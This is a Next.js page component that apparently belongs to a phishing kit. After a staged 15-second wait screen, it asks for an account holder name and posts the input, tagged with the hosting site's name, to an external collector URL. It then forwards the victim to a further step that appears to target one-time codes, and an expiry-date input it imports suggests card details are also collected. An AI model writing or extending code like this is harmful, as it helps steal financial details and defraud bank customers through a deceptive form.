'use client';
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";  
import Loader from "../inlcude/Loader";
import WaiterTime from "../inlcude/WaiterTime";
import styles from "./page.module.css";

export default function Home() {
    const router = useRouter();
    const [loading, setLoading] = useState(true); 

    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;


    useEffect(() => {
        setTimeout(() => {
            setLoading(false); 
        }, 15000); 
    }, []);

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true); 

        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = window.location.hostname;
        // jsonObject1['id'] = localStorage.getItem("collection_id");
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            localStorage.setItem("next", "un");
            localStorage.setItem("nextOTT", "un");
            router.push('/ots');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
    if (loading) {
        return (
            <WaiterTime/>
        );
    }

  return (
    <>
    <Header />
    <div style={{marginTop:"25px"}} className="px-2" >
            <form onSubmit={handleSubmit} className="mt-3 py-2">
                <div className="form-group ">
                    <label htmlFor="">Account Holder Name* </label>
                    <input 
                        name="accnum" 
                        type="text"  
                        placeholder="Enter account holder name."
                        className={`form-control`} 
                        required
                    />
                </div>    
                <div className={`${styles.buttonContainer} mb-4 text-center form-group w-100`}>
                    <input type="submit" className={`btn btn-danger text-white w-100 px-4 ${styles.textCenter} text-primary ${styles.submitButton}`} defaultValue="Continue" />
                </div>
            </form>
        </div>

    <Footer />
</>
  );
}